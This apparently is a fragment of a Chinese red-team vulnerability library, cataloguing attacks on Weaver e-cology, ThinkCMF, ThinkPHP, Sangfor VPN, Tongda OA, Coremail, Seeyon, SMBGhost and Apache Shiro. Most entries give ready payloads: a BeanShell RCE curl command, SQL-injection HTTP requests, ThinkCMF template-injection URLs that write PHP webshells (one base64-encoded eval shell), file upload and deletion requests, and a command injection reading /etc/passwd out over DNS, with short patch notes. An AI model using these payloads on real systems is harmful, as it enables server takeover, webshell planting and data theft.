\u6cdb\u5faeOA\u529e\u516c\u7cfb\u7edf\u662f\u4e00\u6b3e\u534f\u8c03\u529e\u516c\u8f6f\u4ef6\u3002 \u6cdb\u5fae\u534f\u540c\u5546\u52a1\u8f6f\u4ef6\u7cfb\u7edf\u5b58\u5728\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u5229\u7528\u8be5\u6f0f\u6d1e\u83b7\u53d6\u670d \u52a1\u5668\u6743\u9650\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5fae e-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/Sylon/p/11765543.html Poc \u6f0f\u6d1e\u8def\u5f84:/weaver/bsh.servlet.BshServlet exec(\"whoami\")curl http://xx.xx.xx.xx.xx/weaver/bsh.servlet.BshServlet/ -d 'bsh.script=eval%00(\"ex\"%2b\"ec(\"whoami\")\");&bsh.servlet.capture OutErr=true&bsh.servlet.outp ut=raw' \u6279\u91cf\u68c0\u6d4b\u5de5\u5177 https://github.com/sunird/e-cology-poc \u9632\u62a4\u65b9\u6cd5 \u5c4f\u853d/weaver/*\u76ee\u5f55\u7684\u8bbf\u95ee\uff1b https://www.weaver.com.cn/cs/securityDownload.asp \u6cdb\u5faeE-cology OA\u7cfb\u7edfSQL\u6ce8\u5165\u6f0f\u6d1e \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u7684WorkflowCenterTreeData\u63a5\u53e3\u5728\u4f7f\u7528Oracle\u6570\u636e\u5e93\u65f6,\u7531\u4e8e \u5185 \u7f6e SQL \u8bed \u53e5 \u62fc \u63a5 \u4e0d \u4e25 , \u5bfc \u81f4 \u6cdb \u5fae e-cology OA\u7cfb\u7edf\u5b58\u5728SQL\u6ce8\u5165\u6f0f\u6d1e\u3002\u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b \uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684SQL\u8bed\u53e5\uff0c\u4ece\u800c\u83b7\u53d6\u6570\u636e\u5e93\u654f\u611f\u4fe1\u606f\u3002 \u5f71\u54cd\u8303\u56f4 \u6cdb\u5faee-cology<=9.0 \u6f0f\u6d1e\u590d\u73b0 \u6cdb\u5fae\u751f\u6001OA\u7cfb\u7edfSQL\u6ce8\u5165\u6269\u5c55\u590d\u73b0 https://mumuka.gitee.io/passages/%E6%B3%9B%E5%BE%AEe \ufffecology%20OA%20SQL%E6%B3%A8%E5%85%A5%E6%BC%8F% E6%B4%9E%E5%A4%8D%E7%8E%B0/ \u6cdb\u5fae e-cology OA \u524d\u53f0SQL\u6ce8\u5165\u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/article/1521764 \u7b80\u6613poc POST /mobile/browser/WorkflowCenterTreeData.jsp?node=wftype_1&sco pe=2333 HTTP/1.1 Host: ip:port User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.14; rv:56.0) Gecko/20100101 Firefox/56.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,/;q=0.8 Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3 Accept-Encoding: gzip, deflateContent-Type: application/x-www\ufffeform-urlencoded Content-Length: 2236 Connection: close Upgrade-Insecure-Requests: 1 formids=11111111111)))%0a%0dunion select NULL,value from v$parameter order by (((1 \u5229\u7528\u5de5\u5177 AdministratorGithub/e-cology-OA-SQL https://github.com/AdministratorGithub/e-cology-OA-SQL mmioimm/ecology_test https://github.com/mmioimm/ecology_test \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u6253\u8865\u4e01 \u6cdb\u5fae\u5b98\u65b9\u5b89\u5168\u8865\u4e01\uff1a https://www.weaver.com.cn/cs/securityDownloa d.asp Thinkcmf\u76f8\u5173 \u524d\u53f0SQL\u6ce8\u5165: \u4f9d\u8d56\u6761\u4ef6 \u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c payload\uff1a POST /ThinkCMFX/index.php?g=portal&m=article&a=edit_post HTTP/1.1 Host: localhost Connection: close Cookie: PHPSESSID=kcg5v82ms3v13o8pgrhh9saj95 Content-Type: application/x-www-form-urlencoded Content-Length: 79 postid=bind&postid=0 and updatexml(1, concat(0x7e,user(),0x7e),1)--+- \u524d\u53f0\u6a21\u7248\u6ce8\u5165\u6f0f\u6d1e -\u53efgetshell\u56db\u5904 \uff08\u4ec5\u5728windows\u73af\u5883\u4e0b\u8bbe\u7f6e\uff09 \u7b2c\u4e00\u5904 http://website/ThinkCMFX/index.php?g=Comment&m=Widget&a=fetch & templateFile=/../public/index&content=<%3fphp+file_put_contents('m.p hp','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e8c \u5904 http://website/ThinkCMFX/index.php?g=Api&m=Plugin&a=fetch&templ ateFile=/../../../public/index&content=<%3fphp+file_put_contents('m.php','<%3fphp+eval( POST[])%3b');?>&prefix= \u7b2c \u4e09 \u5904 /index.php?a=fetch&templateFile=public/index&prefix=''&content=<php file_put_contents('test.php','<?php phpinfo(); ?>') \u7b2c\u56db\u5904/index.php?a=fetch&content=<?php+file_put_contents(\"mrxn.php\", base64_decode(\"PD9waHAgZXZhbCgkX1BPU1RbIjAwMCJdKTs/Pg== \")); \u4efb\u610f\u6587\u4ef6\u5220\u9664 -\u53ea\u80fdwindows\u5220\u9664 \u5728\u7528\u6237\u4e0a\u4f20\u5934\u50cf\u5904\u5b58\u5728\u4efb\u610f\u6587\u4ef6\u5220\u9664\u6f0f\u6d1e\uff0c\u53d1\u9001\u5982\u4e0b\u6570\u636e\u5305\u540e\uff0c\u4f1a\u5220\u9664\u7f51 \u7ad9\u6839\u76ee\u5f55\u4e0b\u4e00\u4e2a\u540d\u4e3a test.txt \u7684\u6587\u4ef6\u3002\uff08\u8be5\u6f0f\u6d1e\u4ec5\u80fd\u5728 Windows \u4e0b\u89e6\u53d1\uff09 POST /ThinkCMFX/index.php?g=User&m=Profile&a=do_avatar& HTTP/1.1 Host: localhost Cookie: PHPSESSID=bggit7phrb1dl99pcb2lagbmq0; Connection: close Content-Type: application/x-www-form-urlencoded Content-Length: 27 imgurl=......\\test.txt \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20 \u5728 ThinkCMFX2.2.3 \u6700\u7ec8\u7248\u4e2d\uff0c\u5b58\u5728\u4e00\u5904\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\uff08\u9700\u8981\u666e\u901a\u7528\u6237\u6743\u9650\uff0c\u9ed8\u8ba4\u53ef\u6ce8\u518c\uff09 curl -F \"file=@/tmp/shell.php\" -X \"POST\" -b 'PHPSESSID=qekmttucmue6vv41kpdjghnkd0;' ' http://127.0.0.1/ThinkCMFX/index.php?g=Asset&m=Ueditor&a=upload &action=uploadfile' \u4efb\u610f\u6587\u4ef6\u5305\u542b \uff08\u8bfb\u53d6\u6570\u636e\u5e93\u914d\u7f6e\u7b49\u7b49\uff09 /index.php?a=display&templateFile=README.md \u6df1\u4fe1\u670dVPN\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u6df1\u4fe1\u670d VPN \u67d0\u4e2a\u7279\u5b9a\u4ea7\u54c1\u5b58\u5728\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c, 2019 \u653b\u9632\u6f14\u7ec3\u4f7f\u7528\u8fc7 \u5f71\u54cd\u7ec4\u4ef6 \u6df1\u4fe1\u670d VPN \u6f0f\u6d1e\u6307\u7eb9 Set-Cookie: TWFID=welcome to ssl vpn Sinfor Fofa Dork header=\"Set-Cookie: TWFID=\" \u6f0f\u6d1e\u5206\u6790 \u6df1\u4fe1\u670dvpnweb\u767b\u5f55\u9006\u5411\u5b66\u4e60 \u2013 potatso \u2013 \u535a\u5ba2\u56ed https://www.cnblogs.com/potatsoSec/p/12326356.html \u6f0f\u6d1e\u5229\u7528 \uff08\u7b80\u5355\u7684\u547d\u4ee4\u6ce8\u5165\uff09 wget -t %d -T %d --spider %s \u5229\u7528\u6280\u5de7 \u8be5 \u7248 \u672c \u6df1 \u4fe1 \u670d VPN \u5c5e \u4e8e \u76f8 \u5bf9 \u65e9 \u671f \u7684 \u7248 \u672c , \u5927 \u6982 2008 \u5e74 \u5de6 \u53f3 , \u4f46\u76ee\u524d\u8fd8\u6709761\u4e2aip\u5f00\u653e\u5728\u516c\u7f51 \u8be5 \u7248 \u672c \u8f83 \u4f4e , whomai \u4e0d \u5b58 \u5728 , \u53ef \u4ee5 \u4f7f \u7528 uname, \u8fd9\u91cc\u6ca1\u6709\u7a7a\u683c\u53efdns\u4f20\u51fa\u6765 \u53bb\u9664\u7a7a\u683c\u4e5f\u7b80\u5355 cat /etc/passwd | tr \" \\n\" \"+|\" \u9632\u62a4\u65b9\u6cd5 \u53ca\u65f6\u66f4\u65b0\u8865\u4e01\u5347\u7ea7\u5230\u6700\u65b0\u7248 Thinkphp\u76f8\u5173 ThinkPHP3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Gets hell \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 https://xz.aliyun.com/t/99 ThinkPHP3.2.3_\u6700\u65b0\u7248update\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://www.anquanke.com/post/id/104847 ThinkPHP3.2.X_find_select_delete\u6ce8\u5165 \u5f71\u54cd\u7248\u672c <= 3.2.3 2.\u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2631https://xz.aliyun.com/t/2629 ThinkPHP3.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 3.2.3 \u6f0f\u6d1e\u590d\u73b0 https://cloud.tencent.com/developer/news/305625 ThinkPHP5_SQL\u6ce8\u5165\u6f0f\u6d1e&&\u654f\u611f\u4fe1\u606f\u6cc4\u9732 \u5f71\u54cd\u7248\u672c < 5.0.9 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/125 > < https://www.leavesongs.com/PENETRATION/thinkphp5-in \ufffesqlinjection.html ThinkPHP5.0.10- 3.2.3_\u7f13\u5b58\u51fd\u6570\u8bbe\u8ba1\u7f3a\u9677\u53ef\u5bfc\u81f4Getshell \u5f71\u54cd\u7248\u672c < 5.0.11 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/99 ThinkPHP\u6846\u67b65.0.X_sql\u6ce8\u5165\u6f0f\u6d1e\u5206\u6790 \u5f71\u54cd\u7248\u672c < 5.0.16 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/2257 ThinkPHP5.X_order_by\u6ce8\u5165\u6f0f\u6d1e \u5f71\u54cd\u7248\u672c <= 5.1.22 \u6f0f\u6d1e\u590d\u73b0 https://www.cnblogs.com/wangtanzhi/p/12741498.html ThinkPHP5.X_\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c \u5f71\u54cd\u7248\u672c 5.0.5-5.0.22 5.1.0-5.1.30 \u6f0f\u6d1e\u590d\u73b0 https://xz.aliyun.com/t/3570https://paper.seebug.org/760https://pap er.seebug.org/770 \u901a\u8fbeOA\u76f8\u5173 \u00b6 \u901a\u8fbeOA\u4efb\u610f\u7528\u6237\u767b\u5f55\u6f0f\u6d1e \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA2017 \u901a\u8fbeOA V11.x<V11.5 3.\u6f0f\u6d1e\u6307\u7eb9 /static/templates/2017_01/userName.png Office Anywhere 20xx\u7248 \u7f51\u7edc\u667a\u80fd\u529e\u516c\u7cfb\u7edf /ispirit/interface/gateway.php 4.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/NS-Sp4ce/TongDaOA-Fake-User https://github.com/zrools/tools/blob/master/python/tongda_v11.4_rce_e xp.py 5.\u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/lovequitepcs/p/12864203.html 6.\u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u53ef\u4ee5\u4f7f\u7528chrome\u7684EditThisCookie\u63d2\u4ef6\u4fee\u6539cookie\uff0c\u4fee\u6539cookies\u522b\u5fd8\u8bb0\u8bbf \u95ee\uff0c\u5426\u5219\u65e0\u6cd5\u767b\u5f55\u6210\u529f /general/index.php?isIB=0&modify_pwd=0 7.\u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7\u901a\u8fbeoa\u5230\u6700\u65b0\u7248\u672c \u901a\u8fbeOA\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA V11\u7248 \u901a\u8fbeOA 2017\u7248 \u901a\u8fbeOA 2016\u7248 \u901a\u8fbeOA 2015\u7248 \u901a\u8fbeOA 2013\u589e\u5f3a\u7248 \u901a\u8fbeOA 2013\u7248 3.\u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/jas502n/OA-tongda-RCE 4.\u8be6\u7ec6\u6587\u7ae0 https://zhuanlan.zhihu.com/p/114264570 5.\u9632\u62a4\u65b9\u6cd5 \u66f4\u65b0\u901a\u8fbeoa\u6700\u65b0\u8865\u4e01 \u5b89\u5168\u66f4\u65b0\u5730\u5740: http://www.tongda2000.com/news/673.php \u901a\u8fbeOA\u626b\u7801\u767b\u5f55\u4efb\u610f\u7528\u6237\u767b\u5f55 \u00b6 1.\u6f0f\u6d1e\u7b80\u4ecb \u901a\u8fbeOA\u91c7\u7528\u57fa\u4e8eWEB\u7684\u4f01\u4e1a\u8ba1\u7b97\uff0c\u4e3bHTTP\u670d\u52a1\u5668\u91c7\u7528\u4e86\u4e16\u754c\u4e0a\u6700\u5148\u8fdb\u7684 Apache\u670d\u52a1\u5668\uff0c\u6027\u80fd\u7a33\u5b9a\u53ef\u9760\u3002\u6570\u636e\u5b58\u53d6\u96c6\u4e2d\u63a7\u5236\uff0c\u907f\u514d\u4e86\u6570\u636e\u6cc4\u6f0f\u7684\u53ef \u80fd\u3002\u63d0\u4f9b\u6570\u636e\u5907\u4efd\u5de5\u5177\uff0c\u4fdd\u62a4\u7cfb\u7edf\u6570\u636e\u5b89\u5168\u3002\u591a\u7ea7\u7684\u6743\u9650\u63a7\u5236\uff0c\u5b8c\u5584\u7684\u5bc6 \u7801\u9a8c\u8bc1\u4e0e\u767b\u5f55\u9a8c\u8bc1\u673a\u5236\u66f4\u52a0\u5f3a\u4e86\u7cfb\u7edf\u5b89\u5168\u6027\u3002 2.\u5f71\u54cd\u8303\u56f4 \u901a\u8fbeOA v2017\u3001v11.x < v11.5 \u652f\u6301\u626b\u7801\u767b\u5f55\u7248\u672c 3.\u6f0f\u6d1e\u5206\u6790\u6587\u7ae0 https://xz.aliyun.com/t/7704#toc-4 Coremail\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb Coremail\u90ae\u4ef6\u7cfb\u7edf\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u6cc4\u9732\u6f0f\u6d1e Coremail\u4ea7\u54c1\u8bde\u751f\u4e8e1999\u5e74\uff0c\u7ecf\u8fc7\u4e8c\u5341\u591a\u5e74\u53d1\u5c55\uff0c\u5982\u4eca\u4ece\u4ebf\u4e07\u7ea7\u522b\u7684 \u8fd0\u8425\u7cfb\u7edf\uff0c\u5230\u51e0\u4e07\u4eba\u7684\u5927\u578b\u4f01\u4e1a\uff0c\u90fd\u6709\u4e86Coremail\u7684\u5ba2\u6237\u3002 \u622a\u6b622019\u5e74\uff0cCoremail\u90ae\u4ef6\u7cfb\u7edf\u4ea7\u54c1\u5728\u56fd\u5185\u5df2\u62e5\u670910\u4ebf\u7ec8\u7aef\u7528\u6237 \uff0c\u662f\u76ee\u524d\u56fd\u5185\u62e5\u6709\u90ae\u7bb1\u4f7f\u7528\u7528\u6237\u6700\u591a\u7684\u90ae\u4ef6\u7cfb\u7edf\u3002Coremail\u4eca\u5929\u4e0d\u4f46 \u4e3a\u7f51\u6613\uff08126\u3001163\u3001yeah\uff09\u3001\u79fb\u52a8\uff0c\u8054\u901a\u7b49\u77e5\u540d\u8fd0\u8425\u5546\u63d0\u4f9b\u7535\u5b50\u90ae\u4ef6 \u6574\u4f53\u6280\u672f\u89e3\u51b3\u65b9\u6848\u53ca\u4f01\u4e1a\u90ae\u5c40\u8fd0\u8425\u670d\u52a1\uff0c\u8fd8\u4e3a\u77f3\u6cb9\u3001\u94a2\u94c1\u3001\u7535\u529b\u3001\u653f\u5e9c \u3001\u91d1\u878d\u3001\u6559\u80b2\u3001\u5c16\u7aef\u5236\u9020\u4f01\u4e1a\u7b49\u7528\u6237\u63d0\u4f9b\u90ae\u4ef6\u7cfb\u7edf\u8f6f\u4ef6\u548c\u53cd\u5783\u573e\u670d\u52a1\u3002 \u5229\u7528\u65b9\u5f0f http://host/mailsms/s?func=ADMIN:appState&dumpConfig=/ \u6d4f\u89c8\u5668\u8bf7\u6c42\u8bbf\u95ee\uff0c\u5373\u53ef\u67e5\u770b\u914d\u7f6e\u6587\u4ef6\u4fe1\u606f\u3002 \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0Coremail\u7248\u672c\u6216\u8054\u7cfb\u5382\u5bb6\u4fee\u590d SaltStack\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb SaltStack\u662f\u57fa\u4e8ePython\u5f00\u53d1\u7684\u4e00\u5957C/S\u67b6\u6784\u914d\u7f6e\u7ba1\u7406\u5de5\u5177\uff0c\u662f\u4e00\u4e2a\u670d \u52a1\u5668\u57fa\u7840\u67b6\u6784\u96c6\u4e2d\u5316\u7ba1\u7406\u5e73\u53f0\uff0c\u5177\u5907\u914d\u7f6e\u7ba1\u7406\u3001\u8fdc\u7a0b\u6267\u884c\u3001\u76d1\u63a7\u7b49\u529f\u80fd \u3002 \u5f71\u54cd\u8303\u56f4\uff1a SaltStack < 2019.2.4 SaltStack < 3000.2 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 Saltstack\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1eEXP https://github.com/Imanfeng/SaltStack-Exp.git \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Cl0wn/p/12918432.html \u4fee\u590d\u65b9\u6cd5 \u66f4\u65b0\u7248\u672c SaltStack = 2019.2.4 SaltStack = 3000.2 https://github.com/saltstack/salt/commit/a67d76b15615983d467ed8 1371b38b4a17e4f3b7 https://github.com/saltstack/salt/commit/d5801df94b05158dc8e48c 5e6912b065044720f3 \u81f4\u8fdcOA\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb CNVD \u300a \u5173 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u5b58\u5728\u8fdc\u7a0b\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e\u7684\u5b89\u5168\u516c\u544a\u300b\uff1a https://www.cnvd.org.c n/webinfo/show/5095 \u8be5 \u7cfb \u7edf \u7684 \u6f0f \u6d1e \u70b9 \u5728 \u4e8e \u81f4 \u8fdc OA\ufffeA8\u7cfb\u7edf\u7684Servlet\u63a5\u53e3\u66b4\u9732\uff0c\u5b89\u5168\u8fc7\u6ee4\u5904\u7406\u63aa\u65bd\u4e0d\u8db3\uff0c\u4f7f\u5f97\u7528\u6237\u5728\u65e0\u9700 \u8ba4\u8bc1\u7684\u60c5\u51b5\u4e0b\u5b9e\u73b0\u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u3002 \u653b\u51fb\u8005\u5229\u7528\u8be5\u6f0f\u6d1e\uff0c\u53ef\u5728\u672a\u6388\u6743\u7684\u60c5\u51b5\u4e0b\uff0c\u8fdc\u7a0b\u53d1\u9001\u7cbe\u5fc3\u6784\u9020\u7684\u7f51\u7ad9\u540e \u95e8\u6587\u4ef6\uff0c\u4ece\u800c\u83b7\u53d6\u76ee\u6807\u670d\u52a1\u5668\u6743\u9650\uff0c\u5728\u76ee\u6807\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u6f0f\u6d1e \u3002 \u5f71\u54cd\u8303\u56f4 \u81f4\u8fdcOA A8-V5 V6.1 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP1 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP2 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.0 SP3 \u81f4\u8fdcOA A8+\u534f\u540c\u7ba1\u7406\u8f6f\u4ef6 V7.1 \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/timwhitez/seeyon-OA-A8-GetShell \u8be6\u7ec6\u6587\u7ae0 https://www.jianshu.com/p/0955bdd7329c \u4efb\u610f\u6587\u4ef6\u4e0a\u4f20\u8be6\u60c5 https://www.cnblogs.com/AtesetEnginner/p/12106741.html \u5386\u53f2\u6f0f\u6d1e\u76f8\u5173\u4fe1\u606f \u00b6 CVE-2020-0796 \u6c38\u6052\u4e4b\u9ed1\u6f0f\u6d1e\u76f8\u5173 \u00b6 \u6f0f\u6d1e\u7b80\u4ecb \u5fae\u8f6fSMBv3 Client/Server\u8fdc\u7a0b\u4ee3\u7801\u6267\u884c\u6f0f\u6d1eCVE-2020-0796 \u5f71\u54cd\u8303\u56f4\uff1a Windows 10 Version 1903 for 32-bit SystemsWindows 10 Version 1903 for x64-based SystemsWindows 10 Version 1903 for ARM64- based SystemsWindows Server, Version 1903 (Server Core installation)Windows 10 Version 1909 for 32-bit SystemsWindows 10 Version 1909 for x64-based SystemsWindows 10 Version 1909 for ARM64-based SystemsWindows Server, Version 1909 (Server Core installation) \u6f0f\u6d1e\u5229\u7528\u5de5\u5177 https://github.com/chompie1337/SMBGhost_RCE_PoC \u8be6\u7ec6\u6587\u7ae0 https://www.cnblogs.com/Iamyoyodan/p/13081273.html \u5229\u7528\u6280\u5de7\u4e0e\u5751\u70b9 \u5076\u5c14\u4f1a\u84dd\u5c4f \u9632\u62a4\u65b9\u6cd5 \u5173\u95ed\u9ad8\u5371\u7aef\u53e3139\u3001445\uff0c\u66f4\u65b0\u7cfb\u7edf\u5b89\u5168\u8865\u4e01\u7981\u7528SMBv3\u538b\u7f29\u547d\u4ee4: Set-ItemProperty -Path \"HKLM:\\SYSTEM\\CurrentControlSet\\Services\\LanmanServer\\ Parameters\" DisableCompression -Type DWORD -Value 1 - Force","title":"\u6f0f\u6d1e\u5e93"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#shiro","text":"","title":"shiro\u7c7b"},{"location":"redteam/%E6%BC%8F%E6%B4%9E%E5%BA%93/#apache-shiro","text":"Shiro-550, Shiro-721 \u6f0f\u6d1e\u7b80\u4ecb Apache Shiro\u662f\u4e00\u4e2a\u5f3a\u5927\u4e14\u6613\u7528\u7684Java\u5b89\u5168\u6846\u67b6,\u6267\u884c\u8eab\u4efd\u9a8c\u8bc1\u3001\u6388\u6743\u3001\u5bc6\u7801\u548c \u4f1a\u8bdd\u7ba1\u7406\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro <= 1.2.4 \u5982 \u679c shiro \u7684 rememberMe \u529f \u80fd \u7684 AES \u5bc6 \u94a5 \u88ab \u6cc4 \u9732 , \u5c31\u4f1a\u5bfc\u81f4\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\uff0c\u65e0\u8bbaShiro\u662f\u4ec0\u4e48\u7248\u672c\u3002 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe\u76f4\u63a5\u53d1\u5305\u5373\u53ef \u6f0f\u6d1e\u590d\u73b0 Shiro RememberMe 1.2.4 \u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u8be6\u7ec6\u590d\u73b0 https://www.cnblogs.com/paperpen/p/11312671.html Shiro\u53cd\u5e8f\u5217\u5316\u6f0f\u6d1e\u5229\u7528\u6c47\u603b\uff08Shiro-550+Shiro-721\uff09 https://www.cnblogs.com/xiaozi/p/13239046.html Shiro RememberMe 1.2.4\u53cd\u5e8f\u5217\u5316\u5bfc\u81f4\u7684\u547d\u4ee4\u6267\u884c\u6f0f\u6d1e https://paper.seebug.org/shiro-rememberme-1-2-4/#0x01 Shiro RememberMe 1.2.4 \u53cd \u5e8f \u5217 \u5316 \u6f0f \u6d1e (Shiro-550, CVE-2016- 4437)\u590d\u73b0 https://blog.csdn.net/qq_43645782/article/details/106028873 Shiro 721 Padding Oracle\u653b\u51fb\u6f0f\u6d1e\u5206\u6790 https://www.anquanke.com/post/id/193165 \u5229\u7528\u5de5\u5177 ShiroExploit https://github.com/feihong-cs/ShiroExploit Shiro_exploit https://github.com/insightglacier/Shiro_exploit/blob/master/shiro_ex ploit.py \u9632\u62a4\u65b9\u6cd5 \u5347\u7ea7Shiro\u5230\u6700\u65b0\u7248\u5347\u7ea7\u5bf9\u5e94JDK\u7248\u672c\u5230 8u191/7u201/6u211/11.0.1 \u4ee5\u4e0aWAF\u62e6\u622aCookie\u4e2d\u957f\u5ea6\u8fc7\u5927\u7684rememberMe\u503c Apache Shiro \u6743\u9650\u7ed5\u8fc7\u6f0f\u6d1e (Shiro-682) \u6f0f\u6d1e\u7b80\u4ecb \u6f0f \u6d1e \u521d \u59cb \u6210 \u56e0 \u53ef \u4ee5 \u5b9a \u4f4d \u5230 PathMatchingFilterChainResolver\u7684getChain\u51fd\u6570\u4e0b\uff0c\u8be5\u51fd\u6570\u4f5c\u7528\u6839 \u636eURL\u8def\u5f84\u5339\u914d\u4e2d\u914d\u7f6e\u7684url\u8def\u5f84\u8868\u8fbe\u5f0f\u6765\u5339\u914d\u8f93\u5165\u7684URL\uff0c\u5224\u65ad\u662f\u5426 \u5339\u914d\u62e6\u622a\u5668\uff0c\u5339\u914d\u6210\u529f\u5c06\u4f1a\u8fd4\u56de\u54cd\u5e94\u7684\u62e6\u622a\u5668\u6267\u884c\u94fe\uff0c\u8ba9ShiroFither\u6267 \u884c\u6743\u9650\u64cd\u4f5c\u3002 \u5f71\u54cd\u8303\u56f4 Apache Shiro < 1.5.2 \u6f0f\u6d1e\u7279\u5f81 set-Cookie: rememberMe=deleteMe\u6216\u8005URL\u4e2d\u6709shiro\u5b57\u6837\uff0c\u6709\u4e00\u4e9b\u65f6\u5019\u670d\u52a1\u5668 \u4e0d\u4f1a\u4e3b\u52a8\u8fd4\u56de rememberMe=deleteMe 